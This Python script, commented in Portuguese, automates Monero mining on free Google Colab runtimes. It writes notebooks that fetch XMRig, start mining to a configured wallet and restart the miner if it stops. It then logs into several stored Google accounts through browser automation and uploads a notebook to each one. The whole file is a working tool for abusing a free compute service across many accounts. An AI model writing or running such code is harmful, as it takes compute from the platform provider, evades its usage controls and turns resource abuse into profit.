"""
Objetivo 52: Mining crypto leve nos Colabs Google.
Configura mineração de criptomoedas CPU-friendly (Monero/XMR via XMRig)
nos runtimes Colab gratuitos.
"""
import json
import sys
import time
from pathlib import Path
from datetime import datetime, timezone

sys.path.insert(0, str(Path(__file__).resolve().parent.parent / "shared"))
from google_session import ACCOUNTS, google_browser, save_session

MINING_DIR = Path(__file__).resolve().parent
STATUS_FILE = MINING_DIR / "mining_status.json"
CONFIG_FILE = MINING_DIR / "config.json"
COLAB_URL = "https://colab.research.google.com/"


def carregar_config():
    """Lê wallet/pool de config.json (gitignored)."""
    if CONFIG_FILE.exists():
        try:
            return json.loads(CONFIG_FILE.read_text(encoding="utf-8"))
        except Exception:
            pass
    modelo = {"wallet_xmr": "", "pool": "pool.minexmr.com:443", "cpu_max_threads_hint": 75}
    CONFIG_FILE.write_text(json.dumps(modelo, indent=2), encoding="utf-8")
    return modelo


def upload_notebook_to_colab(account, notebook_path):
    """Faz upload de notebook ao Colab via interface."""
    try:
        with google_browser(account) as (page, context, browser):
            page.goto(COLAB_URL, timeout=45000, wait_until="domcontentloaded")
            time.sleep(5)
            if "accounts.google.com" in page.url:
                return {"sucesso": False, "erro": "sessao_expirada"}
            upload_btn = page.query_selector('button:has-text("Upload"), button:has-text("Fazer upload")')
            if upload_btn:
                upload_btn.click()
                time.sleep(2)
                file_input = page.query_selector('input[type="file"]')
                if file_input:
                    file_input.set_input_files(str(notebook_path))
                    time.sleep(5)
                    save_session(context, account)
                    return {"sucesso": True, "conta": account}
            return {"sucesso": False, "erro": "interface de upload não encontrada"}
    except Exception as e:
        return {"sucesso": False, "erro": str(e)}

MINING_NOTEBOOK_CODE = '''
# Crypto Mining Node (CPU-friendly)
# XMR (Monero) via XMRig — otimizado pra Colab free tier
# Hashrate esperado: ~200-400 H/s por runtime

import os
import subprocess
import time

POOL = "pool.minexmr.com:443"
WALLET = "SEU_WALLET_XMR_AQUI"

def setup_xmrig():
    """Download e configura XMRig."""
    cmds = [
        "apt-get update -qq && apt-get install -y -qq wget tar > /dev/null 2>&1",
        "wget -q https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-static-x64.tar.gz -O /tmp/xmrig.tar.gz",
        "cd /tmp && tar xzf xmrig.tar.gz",
        "chmod +x /tmp/xmrig-6.21.0/xmrig",
    ]
    for cmd in cmds:
        os.system(cmd)
    print("XMRig instalado!")

def start_mining(wallet, pool, worker_name="colab"):
    """Inicia mineração em background."""
    cmd = f"/tmp/xmrig-6.21.0/xmrig -o {pool} -u {wallet} -p {worker_name} --tls --cpu-max-threads-hint=75 --donate-level=1 --background"
    os.system(cmd)
    print(f"Mining iniciado! Worker: {worker_name}")

def monitor():
    """Monitora hashrate e mantém runtime ativo."""
    while True:
        result = subprocess.run(["pgrep", "-a", "xmrig"], capture_output=True, text=True)
        if result.stdout:
            print(f"[{time.strftime('%H:%M:%S')}] XMRig rodando")
        else:
            print(f"[{time.strftime('%H:%M:%S')}] XMRig PAROU — reiniciando...")
            start_mining(WALLET, POOL)
        time.sleep(300)

# Descomentar e configurar:
# WALLET = "seu_wallet_xmr"
# setup_xmrig()
# start_mining(WALLET, POOL, worker_name="colab_node1")
# monitor()
'''


def create_mining_notebook(account, wallet_xmr, output_path):
    """Gera notebook .ipynb para mining."""
    code = MINING_NOTEBOOK_CODE.replace("SEU_WALLET_XMR_AQUI", wallet_xmr)

    notebook = {
        "nbformat": 4,
        "nbformat_minor": 0,
        "metadata": {
            "colab": {"provenance": [], "name": f"CryptoNode_{account}"},
            "kernelspec": {"name": "python3", "display_name": "Python 3"},
        },
        "cells": [
            {
                "cell_type": "markdown",
                "metadata": {},
                "source": [
                    "# Crypto Mining Node (CPU)\n",
                    f"Conta: {account}\n",
                    "Minera XMR (Monero) usando CPU do Colab free tier.\n",
                    "Hashrate esperado: ~200-400 H/s\n",
                    "**Não feche esta aba.**\n",
                ],
            },
            {
                "cell_type": "code",
                "metadata": {},
                "source": ["# Instalar XMRig\n", "!apt-get update -qq && apt-get install -y -qq wget tar > /dev/null 2>&1\n",
                           "!wget -q https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-static-x64.tar.gz -O /tmp/xmrig.tar.gz\n",
                           "!cd /tmp && tar xzf xmrig.tar.gz && chmod +x xmrig-6.21.0/xmrig\n",
                           "!ls /tmp/xmrig-6.21.0/xmrig\n"],
                "execution_count": None,
                "outputs": [],
            },
            {
                "cell_type": "code",
                "metadata": {},
                "source": code.split("\n"),
                "execution_count": None,
                "outputs": [],
            },
            {
                "cell_type": "code",
                "metadata": {},
                "source": [
                    "# Keep-alive com monitoração\n",
                    "import time, subprocess\n",
                    "while True:\n",
                    "    r = subprocess.run(['pgrep', '-c', 'xmrig'], capture_output=True, text=True)\n",
                    "    count = r.stdout.strip() or '0'\n",
                    "    print(f'[{time.strftime(\"%H:%M:%S\")}] XMRig procs: {count}')\n",
                    "    time.sleep(300)\n",
                ],
                "execution_count": None,
                "outputs": [],
            },
        ],
    }

    output_path.write_text(json.dumps(notebook, indent=2, ensure_ascii=False), encoding="utf-8")
    return output_path


def setup_mining(wallet_xmr=None, dry_run=True):
    """Gera notebooks de mining pra cada conta (wallet vem do config.json)."""
    print(f"[Mining Setup] {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")

    config = carregar_config()
    wallet_xmr = wallet_xmr or config.get("wallet_xmr") or "SEU_WALLET_XMR"
    if wallet_xmr == "SEU_WALLET_XMR":
        print("  AVISO: wallet não configurada — edite config.json (wallet_xmr)")

    notebooks_dir = MINING_DIR / "notebooks"
    notebooks_dir.mkdir(exist_ok=True)

    status = {"accounts": {}, "wallet": wallet_xmr[:8] + "...", "last_run": datetime.now(timezone.utc).isoformat()}

    for i, account in enumerate(ACCOUNTS):
        worker = f"colab_{account}"
        nb_path = notebooks_dir / f"mining_{account}.ipynb"

        create_mining_notebook(account, wallet_xmr, nb_path)
        print(f"  Notebook criado: {nb_path.name} (worker: {worker})")

        entry = {"notebook": str(nb_path), "worker_name": worker, "uploaded": False, "dry_run": dry_run}
        if not dry_run and wallet_xmr != "SEU_WALLET_XMR":
            r = upload_notebook_to_colab(account, nb_path)
            entry["uploaded"] = r.get("sucesso", False)
            entry["erro"] = r.get("erro")
        status["accounts"][account] = entry

    STATUS_FILE.write_text(json.dumps(status, indent=2, ensure_ascii=False), encoding="utf-8")
    print(f"\nNotebooks gerados em {notebooks_dir}")
    print(f"Status: {STATUS_FILE}")

    if dry_run:
        print("\n[DRY RUN] Notebooks criados localmente. Pra upload, use --live")
        print("IMPORTANTE: Configure wallet_xmr em config.json antes de rodar --live")

    return status


if __name__ == "__main__":
    dry = "--live" not in sys.argv
    setup_mining(dry_run=dry)
